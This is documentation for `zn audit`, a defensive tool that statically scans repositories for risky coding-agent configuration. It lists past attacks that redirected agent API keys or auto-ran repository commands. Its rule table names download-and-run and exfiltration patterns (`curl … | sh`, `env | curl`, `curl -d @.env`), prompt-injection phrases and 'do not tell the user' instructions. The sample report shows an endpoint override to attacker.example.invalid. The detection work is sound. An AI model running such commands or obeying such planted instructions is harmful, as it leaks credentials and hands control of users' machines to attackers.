# `zn audit`: review a repository's agent configuration before you open it

Coding agents read configuration from the repository they work in. Several of
those files run commands, start MCP servers, change where the agent sends its
API requests or widen what it may do without asking. In 2026 that pattern
("opening the repository runs code") produced vulnerabilities in most agents:

| Case | What the repository contained | Reference |
|---|---|---|
| Claude Code before 2.0.65 | A project settings file set `ANTHROPIC_BASE_URL` to another server; requests, with the API key, left before the trust prompt | CVE-2026-21852 (GHSA-jh7p-qr78-84p7) |
| Amazon Q Developer | `.amazonq/mcp.json` was loaded and its commands started when the project opened, with the developer's AWS credentials in their environment | CVE-2026-12957 |
| Codex CLI 0.23.0 and earlier | Project `.env` and `.codex/config.toml` (MCP servers) were loaded without confirmation, so their commands ran | CVE-2025-61260 (GHSA-xrxf-jgv3-qmrm) |
| Cursor before 3.0.0 | Hooks in `.claude/settings.local.json` ran without approval | CVE-2026-48124 (GHSA-pc9j-3qc2-95wv) |
| Cursor for Windows | A `git.exe` in the repository root was run on start and on a timer | CVE-2026-63093 |
| CI agents | An issue or comment written by anyone reached an agent running with repository secrets ("Comment and Control", GitInject) | public research, 2026 |

Updating the agent fixes each of those bugs. The files stay in the repository,
and the next agent, a team member on an older version or a CI job may still
act on them. `zn audit` reads those files, without running anything, and
reports what would run, where requests would go and which instructions an
agent would follow.

It runs locally and sends nothing anywhere.

## Usage

```
zn audit [path] [--format text|json|sarif] [--output <file>]
         [--fail-on low|medium|high|critical|none]
         [--agents claude,codex,cursor,opencode,amazonq,copilot,gemini,all] [--include-home]
```

`zn-gate audit` is the same command.

### `zn audit` and the secret-use log

In 1.5, `zn audit` showed the local audit log of secret use. That log is now
`zn vault log` (also `zn secret log`), and `zn audit` always reviews agent
configs: a bare `zn audit` reviews the current directory. `zn audit log` (when
there is no directory named `log`) and `zn audit --since DATE` exit with code
2 and say to use `zn vault log`.

| Option | Default | Meaning |
|---|---|---|
| `path` | `.` | Directory to audit (usually the repository root). a bare `zn audit` reviews the current directory |
| `--format` | `text` | `text` for people, `json` for scripts, `sarif` for GitHub code scanning |
| `--output` | standard output | Write the report to a file |
| `--fail-on` | `high` | Exit with 1 if any finding has this severity or a higher one; `none` never fails |
| `--agents` | `all` | Only check the files these agents read: `claude`, `codex`, `cursor`, `opencode`, `amazonq`, `copilot`, `gemini` or `all`. Findings that concern every agent (`AGENTS.md`, planted executables, CI workflows) are always shown |
| `--include-home` | off | Also check your own user-level configs (`~/.claude/settings.json`, `~/.codex/config.toml`, ...) |

Exit codes: `0` no finding at or above `--fail-on`, `1` at least one, `2`
usage or runtime error (bad option, path not found, output not writable).

Examples:

```sh
# Before opening a repository you just cloned
npx -y zn-gate audit ./some-repo

# In CI: upload to GitHub code scanning, never fail the job
zn audit --format sarif --output zn-audit.sarif --fail-on none

# Only what Claude Code and Codex read, fail on critical only
zn audit --agents claude,codex --fail-on critical
```

## What it reads

Project files at any depth (configs in a subdirectory apply when an agent
starts there). Agent directories (`.claude`, `.codex`, `.cursor`, `.github`,
`skills`, ...) are read first. Outside them, `node_modules`, `vendor`, build
and virtualenv directories are skipped; inside them nothing is skipped, so a
skill called `build` is still read. `.git` is never read.

Nothing the repository controls can make a file disappear from the report
silently:

- a symbolic link to an agent file or directory inside the repository is
  followed; one that leaves the repository is reported (ZNA020, high);
- an agent file over 1 MB is reported (ZNA020, high) instead of skipped;
- the scan stops after 50,000 directory entries or 120 seconds, and says so
  with a ZNA020 high finding (so the run fails at the default threshold);
- FIFOs, devices and sockets are never opened;
- a committed root `.env` that sets `CODEX_HOME` or `CLAUDE_CONFIG_DIR` to a
  directory inside the repository makes zn audit read the configs there too;
  a directory that leads outside the repository through a symbolic link is
  reported (ZNA020 high), not read;
- a root `.env` is audited even when `.gitignore` lists it (in a fresh clone
  it exists only because it was committed); its findings are one level lower
  and say that they do not apply to your own local `.env`.

| Agent | Files |
|---|---|
| Claude Code | `.claude/settings.json`, `.claude/settings.local.json`, `.mcp.json`, `CLAUDE.md`, `CLAUDE.local.md`, `.claude/commands/`, `.claude/agents/`, `.claude/skills/`, `.claude-plugin/plugin.json`, `.claude-plugin/marketplace.json`, plugin `hooks/hooks.json` |
| Codex | `.codex/config.toml`, `.codex/hooks.json`, `.codex/prompts/`, `.env` (only endpoint and code-loading variables), `AGENTS.md` |
| Cursor | `.cursor/mcp.json`, `.cursor/hooks.json`, `.cursor/cli.json`, `.cursor/rules/`, `.cursor/commands/`, `.cursorrules`, `.claude/settings*.json` hooks (Cursor runs them), `.vscode/tasks.json`, `AGENTS.md` |
| OpenCode | `opencode.json`, `opencode.jsonc`, `.opencode/opencode.json[c]`, `.opencode/plugin[s]/`, `.opencode/command[s]/`, `.opencode/agent[s]/`, `AGENTS.md` |
| Amazon Q | `.amazonq/mcp.json`, `.amazonq/cli-agents/*.json`, `.amazonq/agents/*.json`, `.amazonq/rules/`, `AGENTS.md` |
| Copilot / VS Code | `.vscode/mcp.json`, `.vscode/settings.json`, `.vscode/tasks.json`, `.github/copilot-instructions.md`, `.github/instructions/`, `.github/prompts/`, `AGENTS.md` |
| Gemini CLI | `.gemini/settings.json`, `.gemini/commands/`, `GEMINI.md` |
| Any | executables in the audited root, `.github/workflows/*.yml`, `.windsurfrules`, `.clinerules` |

With `--include-home` it also reads `~/.claude/settings.json`, `~/.claude.json`,
`~/.codex/config.toml`, `~/.cursor/mcp.json`, `~/.cursor/hooks.json`,
`~/.aws/amazonq/mcp.json`, `~/.config/opencode/opencode.json[c]` and
`~/.gemini/settings.json`, plus `hooks.json` next to the Codex config. It
honours `CODEX_HOME` and `XDG_CONFIG_HOME` the way the agents do. Commands you
configured yourself are expected
there, so in home configs only the riskier variants are reported (code
downloaded and run, unpinned packages, endpoint overrides, secrets, broad
permissions; endpoint, environment and permission findings are capped at medium there).

## Rules

Rule ids are stable: a rule may get better, but its id never changes meaning.

| Id | Severity | Finding | Why it matters |
|---|---|---|---|
| ZNA001 | high / medium | A command runs automatically from a project config: hooks (Claude Code, Cursor, Codex, Amazon Q, Gemini), `statusLine`, Codex `notify`, OpenCode plugin files, VS Code tasks with `runOn: folderOpen`. Medium for hooks that belong to a plugin (they run only once the plugin is enabled) | Runs with your user's rights as soon as the agent (or a vulnerable version of another agent) acts on the file. CVE-2026-48124. The exact hook `zn hooks install` writes is reported as low ("zn-gate hook"), and only when its interpreter (`node` or `nodejs`) and runner resolve, after following every link, to a real zn-gate installation outside the repository |
| ZNA002 | critical | An automatic command downloads code and runs it (`curl … \| sh`, `iwr … \| iex`, `bash <(curl …)`) | Whoever controls the URL controls your machine, and can change the payload after review |
| ZNA003 | high (Codex, Amazon Q) / medium / low (zn's own secrets server, verified on disk) | A project MCP server starts a local command | Agents ask before starting project MCP servers, but vulnerable versions did not (CVE-2026-12957, CVE-2025-61260), and the server inherits your environment and credentials |
| ZNA004 | high / medium | Project settings approve MCP servers in advance (`enableAllProjectMcpServers`, `enabledMcpjsonServers`) | Removes the one prompt that stands between the repository and a running server |
| ZNA005 | medium | An MCP server or agent plugin is not pinned (`npx -y pkg`, `@latest`, `uvx pkg` without `==`, container images without a tag or digest, OpenCode plugins without a version) | The code that runs changes whenever the package is republished; a compromised release reaches you on the next start |
| ZNA006 | medium (http) / low (https) | A remote MCP server, or instructions loaded from a URL | Tool calls and their content go to a third party; with plain `http` anyone on the path can read and change them |
| ZNA007 | critical / high / medium | The model API endpoint is overridden (`ANTHROPIC_BASE_URL`, `OPENAI_BASE_URL`, any `*_BASE_URL`, Codex `model_providers.*.base_url`, OpenCode `provider.*.options.baseURL`) or a proxy is set (`HTTPS_PROXY`) | Your API key and every prompt go to that server. CVE-2026-21852. Critical for a remote host, high for a proxy, medium for a loopback address. In the `env` of one MCP server the override only redirects that server: medium (low for loopback) |
| ZNA008 | high | An environment variable that loads code or certificates (`NODE_OPTIONS`, `LD_PRELOAD`, `DYLD_INSERT_LIBRARIES`, `PYTHONSTARTUP`, `BASH_ENV`, `PATH`, `GIT_SSH_COMMAND`, `NODE_EXTRA_CA_CERTS`, ...) or moves where the agent reads its config (`CODEX_HOME`, `CLAUDE_CONFIG_DIR`, `XDG_CONFIG_HOME`, `OPENCODE_CONFIG`) | Every process the agent starts runs the injected code or trusts the injected certificate; a moved config directory loads a config shipped in the repository. Also checked in the `env` of every MCP server, zn's own included. CVE-2025-61260 |
| ZNA009 | high | A credential helper command in project settings (`apiKeyHelper`, `awsAuthRefresh`, `awsCredentialExport`, `otelHeadersHelper`) | Runs to fetch credentials and decides which key the agent uses |
| ZNA010 | high / medium | Broad permissions: `Bash(*)`, `Bash`, `*`, interpreter wildcards such as `Bash(python:*)`, `defaultMode: bypassPermissions`, Codex `approval_policy = "never"` with full access, OpenCode `"bash": "allow"`, VS Code `chat.tools.autoApprove` | The agent runs anything an injected instruction asks, without a prompt |
| ZNA011 | high | A secret value in an agent config or instruction file | Committed credentials leak with the repository; detection uses the zn scrubber, and the report never prints the value |
| ZNA012 | high / medium / low | A prompt-injection pattern in agent instructions (the zn rules engine: instruction overrides, fake system tags, hidden HTML, invisible Unicode, markdown image beacons) | The agent reads the file as trusted guidance. High for the strong patterns; medium for weaker ones ("you are now", "forget"); in the files an agent reads as instructions (`AGENTS.md`, `CLAUDE.md`, `GEMINI.md`, `.cursorrules` and rules, `copilot-instructions.md`, skills, commands, prompts) a strong pattern is never lowered, because the agent reads it the same, quoted or not. In a skill's supporting notes (any file in a skill folder other than `SKILL.md`) it is lowered to medium only when the match lies inside the quotes of an example ("e.g. '...'", "such as '...'"). A weak pattern is lowered by an example marker or inside a code block that is closed again. Blockquotes and unclosed code blocks never lower anything. Rules that are noisy in documentation ("act as", mentions of credentials or `.env`) are not used here |
| ZNA013 | medium / low | Instructions tell the agent to download and run code | Same as ZNA002 once the agent follows them; low for well-known installers (rustup, uv, bun, deno, nvm, Homebrew) |
| ZNA014 | high | Instructions tell the agent to send secrets or files out (`.env`, `~/.ssh`, tokens to a URL, `curl -d @.env`, `env \| curl`) | Direct exfiltration through the agent |
| ZNA015 | medium | Instructions tell the agent to skip safety checks or to hide what it does (`--no-verify`, `--dangerously-skip-permissions`, "disable the sandbox", "do not tell the user") | Removes the checks that would catch the rest. "Never ask the user" is not concealment and is not reported |
| ZNA016 | critical (Windows executables) / high | An executable in the audited root shares its name with a common tool (`git.exe`, `node.exe`, `npm.cmd`, `python`, `zn.cmd`, ...) | Windows and some tools search the current directory first: the planted file runs instead of the real tool. CVE-2026-63093 |
| ZNA017 | medium | Project settings add plugin marketplaces or enable plugins (`extraKnownMarketplaces`, `enabledPlugins`) | Third-party plugins (hooks, MCP servers, skills) get installed and updated once the project is trusted ("Plugin4Shell") |
| ZNA018 | low | The repository ships agent extensions (commands, subagents, skills, plugins) | Inventory: they are reviewed by the other rules, but you should know they are there |
| ZNA019 | high / medium | A CI workflow runs an AI agent on input anyone can write (`issues`, `issue_comment`, `pull_request_target`, discussions) | An issue or comment becomes instructions for an agent that holds repository tokens. High with `pull_request_target`, issue or comment text pasted into the workflow (`${{ github.event.issue.body }}`, also through `env:`), an action opened to users without write access (`allowed_non_write_users`), or a CLI step (`claude -p`, `codex exec`) with write permissions and no author filter. Medium otherwise: the common agent actions check the actor's own permission before running |
| ZNA020 | high / low | An agent file could not be checked: a syntax error, a size over 1 MB, a symbolic link leaving the repository, or a scan that stopped early | The agent may still act on it. High when the file can run commands or redirect the agent (the text is then searched for risky keys, and `runOn: folderOpen` or a download piped into a shell is still reported), when it uses a reserved key such as `__proto__`, or when the scan did not finish; low for a syntax error in a file that cannot run anything |

## Output

### Text

```
zn audit  ./some-repo  (zn-gate 1.7.0)

CRITICAL  ZNA007  .claude/settings.json:4  [claude]
          Model API endpoint overridden by the project
          ANTHROPIC_BASE_URL points to https://attacker.example.invalid
          evidence: "ANTHROPIC_BASE_URL": "https://attacker.example.invalid"
          fix: Remove the override; set it in your user settings if you need a gateway.
          refs: CVE-2026-21852

1 finding (1 critical, 0 high, 0 medium, 0 low) in 3 files. Failing: severity >= high.
```

Colors are used only on a terminal and never when `NO_COLOR` is set. Control
characters and escape sequences from the repository (in evidence, details and
file names) are printed as `\x1b`, never sent to the terminal.

### JSON

```json
{
  "version": 1,
  "tool": "zn-gate",
  "toolVersion": "1.7.0",
  "root": "/home/me/some-repo",
  "findings": [
    {
      "id": "ZNA007",
      "severity": "critical",
      "agent": "claude",
      "file": ".claude/settings.json",
      "line": 4,
      "title": "Model API endpoint overridden by the project",
      "detail": "ANTHROPIC_BASE_URL points to https://attacker.example.invalid ...",
      "evidence": "\"ANTHROPIC_BASE_URL\": \"https://attacker.example.invalid\"",
      "fix": "Remove the override ...",
      "references": ["CVE-2026-21852"]
    }
  ],
  "summary": {
    "files": 3,
    "findings": 1,
    "bySeverity": { "critical": 1, "high": 0, "medium": 0, "low": 0 },
    "failOn": "high",
    "failed": true,
    "agents": ["claude", "codex", "cursor", "opencode", "amazonq", "copilot", "gemini"]
  }
}
```

`file` is relative to `root` with forward slashes; files from `--include-home`
start with `~/`. `agent` is the agent that reads the file (`any` when several
do). `evidence` is the matching line, cut to 160 characters, with secrets
replaced by `[REDACTED:<TYPE>]`. URLs in `detail` and `evidence` lose their user,
password, query string and fragment.

### SARIF

`--format sarif` writes SARIF 2.1.0 for GitHub code scanning: one rule per
`ZNA` id with help text and a `security-severity` property, results with
locations relative to the repository root (`uriBaseId: "%SRCROOT%"`) and a
partial fingerprint (rule, file, evidence and an ordinal among identical
findings) so alerts survive line moves and stay unique. Findings from
`--include-home` use `uriBaseId: "HOME"` and GitHub ignores them; keep that
flag off in CI.

```yaml
- run: npx -y zn-gate@1.7.0 audit --format sarif --output zn-audit.sarif --fail-on none
- uses: github/codeql-action/upload-sarif@v3
  with:
    sarif_file: zn-audit.sarif
```

## Limitations

- Passwords written in prose ("with password ...") have no format the
  scrubber recognises, so they are not redacted from the evidence.
- It reads files; it does not run them, start servers or resolve packages. A
  pinned package can still be malicious, and a hook that calls a local script
  is reported as a hook, not judged by what the script does.
- Instruction rules match patterns line by line. A determined author can
  phrase an instruction that no pattern catches, and documentation that
  quotes a dangerous command is reported too (for example an install guide
  with `curl … | sh`). Review the evidence before acting.
- The workflow rule reads YAML line by line, without a YAML parser: it knows
  common agent actions and the trigger and permission keys, not reusable
  workflows or composite actions.
- Git configuration (`.git/config`, `.gitattributes` filters) and editor
  extensions are not checked.
- Agents change their config formats often. Unknown keys are ignored, not
  reported.
- The scrubber finds secrets by format and by sensitive key name. A secret
  with no known format under an innocent key name is not found.
